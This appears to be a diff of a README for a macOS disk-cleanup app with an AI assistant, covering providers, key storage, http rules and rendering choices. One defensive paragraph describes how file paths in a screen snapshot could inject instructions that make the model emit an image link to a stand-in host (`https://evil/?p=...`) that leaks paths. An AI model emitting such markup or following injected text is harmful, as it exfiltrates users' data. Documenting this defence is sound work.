@@ -62,7 +62,6 @@ The speech-bubble toolbar button — or **View → Show Inspector (⌃⌘I)** �
 |---|---|---|
 | Anthropic (Claude) | `https://api.anthropic.com` | Messages API |
 | OpenAI | `https://api.openai.com` | Chat Completions |
-| Ollama (local) | `http://localhost:11434` | Chat Completions compatible |
 | OpenAI-compatible (custom) | you provide | Chat Completions |
 
 The app appends the version path (`/v1/messages`, `/v1/chat/completions`). Enter the root only; a trailing slash, a `/v1`, or a full endpoint path copied from the docs is absorbed.
@@ -73,7 +72,7 @@ Every list row has an ⓘ button that opens a popover explaining what the item i
 
 **Models are picked from a dropdown.** The settings screen fetches `GET /v1/models` when it opens (both wire formats return the same shape). Embedding, speech, image and moderation models are filtered out — picking one only produces a failure. Turn on **직접 입력** (manual entry) for names that are not in the list, such as an internal gateway or a preview model. Listing does not require a model name; not knowing the name is the reason to list.
 
-**API keys are the default.** The app does not proxy subscription credentials. Anthropic [explicitly does not permit](https://code.claude.com/docs/en/legal-and-compliance) third-party developers to offer claude.ai login or to route requests through Free/Pro/Max credentials on their users' behalf, and reserves the right to enforce without notice; ChatGPT subscriptions likewise do not include API usage (separate billing). To run without a key, choose a local provider such as Ollama — or turn on the local CLI path below yourself.
+**API keys are the default.** The app does not proxy subscription credentials. Anthropic [explicitly does not permit](https://code.claude.com/docs/en/legal-and-compliance) third-party developers to offer claude.ai login or to route requests through Free/Pro/Max credentials on their users' behalf, and reserves the right to enforce without notice; ChatGPT subscriptions likewise do not include API usage (separate billing). To run without a key, turn on the local CLI path below yourself.
 
 ### Local CLI providers (opt-in)
 
@@ -107,13 +106,13 @@ Guardrails: Claude Code gets every tool denied (the screen snapshot is already i
 
 Setup: log in once in a terminal, then put the output of `which claude` (or `which codex`) into **CLI 실행 파일 경로** in Settings. The default scans common install locations and nvm version directories, because a GUI-launched app only has `PATH=/usr/bin:/bin`. CLIs installed via npm are `#!/usr/bin/env node` shims that also need `node`, so the child process gets the executable's own directory prepended to `PATH`.
 
-**What leaves your machine** — each question sends that screen's **item names, paths, sizes and selection state** to the provider you chose. File contents are never sent. To keep everything local, use a local provider such as Ollama.
+**What leaves your machine** — each question sends that screen's **item names, paths, sizes and selection state** to the provider you chose. File contents are never sent. To keep everything on-device, point **OpenAI 호환 (직접 입력)** at a local server (`http://localhost:…`).
 
 **Key storage** — API keys live in the macOS keychain (`com.jimmy.disktidy.ai`), one entry per provider. `UserDefaults` holds only the provider, root URL and model. Ad-hoc signed builds change signing identity on every build, so the keychain will re-prompt for access.
 
 **The assistant cannot operate the app.** No tool calling is wired up. Deleting, erasing and terminating always require you to press the button yourself, confirmation dialogs included.
 
-Requests are never sent over plaintext `http` to a remote host (key exposure). `http` is allowed for loopback (`localhost`, `127.0.0.1`, `::1`), and for `*.local` LAN addresses **only with providers that need no API key**.
+Requests are never sent over plaintext `http` to a remote host (key exposure). `http` is allowed for loopback (`localhost`, `127.0.0.1`, `::1`) only.
 
 Answers render with [MarkdownView](https://github.com/LiYanan2004/MarkdownView) — chosen for incremental streaming parsing and text selection across blocks — with two defaults changed. **Remote images are never fetched**: file paths in the screen snapshot could steer the model into emitting `![](https://evil/?p=...)`, which would leak the path the moment the answer renders. **Syntax highlighting and math rendering are off**: the library's default style locates resources via `Bundle.module`, and in an ad-hoc-signed app shipping that bundle in the `.app` root breaks codesigning while omitting it crashes on other machines (measured). Messages you type stay verbatim, so a `*` you wrote is not eaten as formatting.
 
